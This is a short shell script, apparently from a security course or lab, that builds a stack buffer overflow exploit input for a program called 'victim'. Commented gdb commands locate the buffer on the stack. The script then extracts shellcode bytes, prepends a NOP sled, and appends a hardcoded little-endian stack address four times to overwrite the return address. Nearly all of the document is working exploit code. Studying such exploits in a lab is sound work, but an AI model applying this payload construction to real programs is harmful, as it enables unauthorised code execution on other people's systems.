#!/bin/sh

#//commands to get address of buffer
#gdb victim
#run <<< `python3 -c 'print("A"*80)'`
#x /40wx $rsp-80
#//buf at lowest location with 0x41414141

#//print the size of shellcode to be injected
#echo $((0xa5-0x78))

#create the input
xxd -s0x78 -l48 -c100 -p shellcode shellcode_hex

a=`printf %016x 0x7fffffffeca0 | tac -rs..`

(python3 -c 'print("90"*24)'; cat shellcode_hex; echo $a; echo $a; echo $a; echo $a) | xxd -r -p > input_to_victim.txt